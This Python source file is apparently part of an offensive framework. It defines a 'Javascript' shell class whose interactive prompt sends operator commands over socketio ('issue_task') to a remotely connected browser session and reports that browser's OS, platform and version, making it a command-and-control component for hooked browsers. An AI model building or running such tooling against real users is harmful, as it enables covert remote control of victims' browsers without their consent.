from core.shell.base_shell import Base_shell
from core.utils.printer import *
from core.browser_server.base_browser_server import socketio

class Javascript(Base_shell):
    
    def interactive(self):
        while True:
            command = input(f"({color_green('javascript')}){self.host} > ")
            if not self.session:
                print_error('Client disconnected')
                break
            elif not command:
                continue
            elif command == 'exit':
                break
            elif command == 'info':
                print_info()
                print_info(f"Os: {self.os}")
                print_info(f"Platform: {self.platform}")
                print_info(f"Version: {self.version}")
                print_info()
            elif command == 'help':
                print_info()
                print_info('\tHelp menu javascript session')
                print_info('\t----------------------------')
                print_info('\texit                   exit shell')
                print_info('\tinfo                   show info')
                print_info('\thelp                   show help')
                print_info()
            else:
                try:
                    self.sessions[int(self.session_id)]   
                except:
                    print_error('Client disconnected')
                    break
                socketio.emit('issue_task', {'id':int(self.session_id),'input': command, 'type':'cmd'}, room=self.sock)
    
    def execute(self, cmd, raw=False):
        socketio.emit('issue_task', {'id':int(self.session_id),'input': cmd, 'type':'return'}, room=self.sock)